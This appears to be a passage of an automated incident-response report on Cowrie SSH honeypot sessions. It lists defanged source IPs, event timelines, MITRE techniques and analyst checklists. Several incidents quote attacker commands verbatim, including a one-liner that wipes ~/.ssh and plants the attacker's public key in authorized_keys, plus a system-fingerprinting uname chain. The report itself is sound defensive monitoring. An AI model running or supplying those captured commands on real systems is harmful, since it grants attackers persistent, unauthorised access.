| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:25:24` | `cowrie.session.connect` |
| `2026-08-07 11:25:24` | `cowrie.client.version` |
| `2026-08-07 11:25:24` | `cowrie.client.kex` |
| `2026-08-07 11:25:24` | `cowrie.login.success` |
| `2026-08-07 11:25:25` | `cowrie.session.params` |
| `2026-08-07 11:25:25` | `cowrie.command.input` |
| `2026-08-07 11:25:25` | `cowrie.command.failed` |
| `2026-08-07 11:25:26` | `cowrie.log.closed` |
| `2026-08-07 11:25:26` | `cowrie.session.params` |
| `2026-08-07 11:25:26` | `cowrie.command.input` |
| `2026-08-07 11:25:26` | `cowrie.session.file_download` |
| `2026-08-07 11:25:26` | `cowrie.log.closed` |
| `2026-08-07 11:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.252.226[.]244` to AbuseIPDB if not already reported
- [ ] Block `5.252.226[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c14d9bb32c

| Field | Detail |
|---|---|
| **Source IP** | `5.252.226[.]244` |
| **First Seen** | 2026-08-07 11:25 |
| **Last Seen** | 2026-08-07 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:25:26` | `cowrie.session.connect` |
| `2026-08-07 11:25:26` | `cowrie.client.version` |
| `2026-08-07 11:25:27` | `cowrie.client.kex` |
| `2026-08-07 11:25:27` | `cowrie.login.success` |
| `2026-08-07 11:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.252.226[.]244` to AbuseIPDB if not already reported
- [ ] Block `5.252.226[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a21c546b1f08

| Field | Detail |
|---|---|
| **Source IP** | `5.252.226[.]244` |
| **First Seen** | 2026-08-07 11:25 |
| **Last Seen** | 2026-08-07 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:25:27` | `cowrie.session.connect` |
| `2026-08-07 11:25:27` | `cowrie.client.version` |
| `2026-08-07 11:25:27` | `cowrie.client.kex` |
| `2026-08-07 11:25:28` | `cowrie.login.success` |
| `2026-08-07 11:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.252.226[.]244` to AbuseIPDB if not already reported
- [ ] Block `5.252.226[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442bc9ff2a8c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]208` |
| **First Seen** | 2026-08-07 11:43 |
| **Last Seen** | 2026-08-07 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:43:47` | `cowrie.session.connect` |
| `2026-08-07 11:43:48` | `cowrie.client.version` |
| `2026-08-07 11:43:48` | `cowrie.client.kex` |
| `2026-08-07 11:43:51` | `cowrie.login.success` |
| `2026-08-07 11:43:52` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]208` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56876f26b5b1

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-07 11:43 |
| **Last Seen** | 2026-08-07 11:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:43:58` | `cowrie.session.connect` |
| `2026-08-07 11:43:59` | `cowrie.client.version` |
| `2026-08-07 11:43:59` | `cowrie.client.kex` |
| `2026-08-07 11:44:01` | `cowrie.login.success` |
| `2026-08-07 11:44:02` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46e360854a1d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-08-07 11:50 |
| **Last Seen** | 2026-08-07 11:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:50:03` | `cowrie.session.connect` |
| `2026-08-07 11:50:04` | `cowrie.client.version` |
| `2026-08-07 11:50:04` | `cowrie.client.kex` |
| `2026-08-07 11:50:06` | `cowrie.login.success` |
| `2026-08-07 11:50:06` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4261e3eab78

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-08-07 11:50 |
| **Last Seen** | 2026-08-07 11:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:50:11` | `cowrie.session.connect` |
| `2026-08-07 11:50:12` | `cowrie.client.version` |
| `2026-08-07 11:50:12` | `cowrie.client.kex` |
| `2026-08-07 11:50:13` | `cowrie.login.success` |
| `2026-08-07 11:50:14` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3341d0a9ab85

| Field | Detail |
|---|---|
| **Source IP** | `60.166.31[.]198` |
| **First Seen** | 2026-08-07 11:53 |
| **Last Seen** | 2026-08-07 11:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:53:17` | `cowrie.session.connect` |
| `2026-08-07 11:53:18` | `cowrie.client.version` |
| `2026-08-07 11:53:18` | `cowrie.client.kex` |
| `2026-08-07 11:53:21` | `cowrie.login.success` |
| `2026-08-07 11:53:22` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.31[.]198` to AbuseIPDB if not already reported
- [ ] Block `60.166.31[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8136e64c97b3

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-08-07 11:53 |
| **Last Seen** | 2026-08-07 11:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:53:27` | `cowrie.session.connect` |
| `2026-08-07 11:53:28` | `cowrie.client.version` |
| `2026-08-07 11:53:28` | `cowrie.client.kex` |
| `2026-08-07 11:53:31` | `cowrie.login.success` |
| `2026-08-07 11:53:32` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ec252ac1a1

| Field | Detail |
|---|---|
| **Source IP** | `80.99.159[.]65` |
| **First Seen** | 2026-08-07 11:57 |
| **Last Seen** | 2026-08-07 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:57:04` | `cowrie.session.connect` |
| `2026-08-07 11:57:04` | `cowrie.client.version` |
| `2026-08-07 11:57:04` | `cowrie.client.kex` |
| `2026-08-07 11:57:04` | `cowrie.login.success` |
| `2026-08-07 11:57:05` | `cowrie.session.params` |
| `2026-08-07 11:57:05` | `cowrie.command.input` |
| `2026-08-07 11:57:05` | `cowrie.log.closed` |
| `2026-08-07 11:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.99.159[.]65` to AbuseIPDB if not already reported
- [ ] Block `80.99.159[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aaf3ae15577

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:04 |
| **Last Seen** | 2026-08-07 12:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:04:19` | `cowrie.session.connect` |
| `2026-08-07 12:04:19` | `cowrie.client.version` |
| `2026-08-07 12:04:19` | `cowrie.client.kex` |
| `2026-08-07 12:04:20` | `cowrie.login.success` |
| `2026-08-07 12:04:21` | `cowrie.session.params` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.success` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:21` | `cowrie.command.input` |
| `2026-08-07 12:04:22` | `cowrie.log.closed` |
| `2026-08-07 12:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c222dfbce37

| Field | Detail |
|---|---|
| **Source IP** | `153.75.250[.]217` |
| **First Seen** | 2026-08-07 12:04 |
| **Last Seen** | 2026-08-07 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:04:41` | `cowrie.session.connect` |
| `2026-08-07 12:04:41` | `cowrie.client.version` |
| `2026-08-07 12:04:41` | `cowrie.client.kex` |
| `2026-08-07 12:04:41` | `cowrie.login.success` |
| `2026-08-07 12:04:42` | `cowrie.session.params` |
| `2026-08-07 12:04:42` | `cowrie.command.input` |
| `2026-08-07 12:04:42` | `cowrie.command.failed` |
| `2026-08-07 12:04:42` | `cowrie.log.closed` |
| `2026-08-07 12:04:42` | `cowrie.session.params` |
| `2026-08-07 12:04:42` | `cowrie.command.input` |
| `2026-08-07 12:04:42` | `cowrie.session.file_download` |
| `2026-08-07 12:04:42` | `cowrie.log.closed` |
| `2026-08-07 12:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.75.250[.]217` to AbuseIPDB if not already reported
- [ ] Block `153.75.250[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aeac2bf87e9

| Field | Detail |
|---|---|
| **Source IP** | `153.75.250[.]217` |
| **First Seen** | 2026-08-07 12:04 |
| **Last Seen** | 2026-08-07 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:04:42` | `cowrie.session.connect` |
| `2026-08-07 12:04:42` | `cowrie.client.version` |
| `2026-08-07 12:04:42` | `cowrie.client.kex` |
| `2026-08-07 12:04:42` | `cowrie.login.success` |
| `2026-08-07 12:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.75.250[.]217` to AbuseIPDB if not already reported
- [ ] Block `153.75.250[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307883b71017

| Field | Detail |
|---|---|
| **Source IP** | `153.75.250[.]217` |
| **First Seen** | 2026-08-07 12:04 |
| **Last Seen** | 2026-08-07 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:04:42` | `cowrie.session.connect` |
| `2026-08-07 12:04:42` | `cowrie.client.version` |
| `2026-08-07 12:04:42` | `cowrie.client.kex` |
| `2026-08-07 12:04:42` | `cowrie.login.success` |
| `2026-08-07 12:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.75.250[.]217` to AbuseIPDB if not already reported
- [ ] Block `153.75.250[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3462a61845d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:05 |
| **Last Seen** | 2026-08-07 12:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:05:51` | `cowrie.session.connect` |
| `2026-08-07 12:05:51` | `cowrie.client.version` |
| `2026-08-07 12:05:51` | `cowrie.client.kex` |
| `2026-08-07 12:05:53` | `cowrie.login.success` |
| `2026-08-07 12:05:54` | `cowrie.session.params` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.success` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:54` | `cowrie.command.input` |
| `2026-08-07 12:05:55` | `cowrie.log.closed` |
| `2026-08-07 12:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ffbede0753

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:07 |
| **Last Seen** | 2026-08-07 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:07:22` | `cowrie.session.connect` |
| `2026-08-07 12:07:22` | `cowrie.client.version` |
| `2026-08-07 12:07:22` | `cowrie.client.kex` |
| `2026-08-07 12:07:24` | `cowrie.login.success` |
| `2026-08-07 12:07:26` | `cowrie.session.params` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.success` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.command.input` |
| `2026-08-07 12:07:26` | `cowrie.log.closed` |
| `2026-08-07 12:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aaf3d40d51b

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-08-07 12:08 |
| **Last Seen** | 2026-08-07 12:08 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:08:16` | `cowrie.session.connect` |
| `2026-08-07 12:08:16` | `cowrie.client.version` |
| `2026-08-07 12:08:30` | `cowrie.client.kex` |
| `2026-08-07 12:08:33` | `cowrie.login.success` |
| `2026-08-07 12:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6107f1d448f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:09 |
| **Last Seen** | 2026-08-07 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:09:04` | `cowrie.session.connect` |
| `2026-08-07 12:09:04` | `cowrie.client.version` |
| `2026-08-07 12:09:04` | `cowrie.client.kex` |
| `2026-08-07 12:09:06` | `cowrie.login.success` |
| `2026-08-07 12:09:08` | `cowrie.session.params` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.success` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.command.input` |
| `2026-08-07 12:09:08` | `cowrie.log.closed` |
| `2026-08-07 12:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd9e1f822f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:10 |
| **Last Seen** | 2026-08-07 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:10:46` | `cowrie.session.connect` |
| `2026-08-07 12:10:47` | `cowrie.client.version` |
| `2026-08-07 12:10:47` | `cowrie.client.kex` |
| `2026-08-07 12:10:48` | `cowrie.login.success` |
| `2026-08-07 12:10:50` | `cowrie.session.params` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.success` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.command.input` |
| `2026-08-07 12:10:50` | `cowrie.log.closed` |
| `2026-08-07 12:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

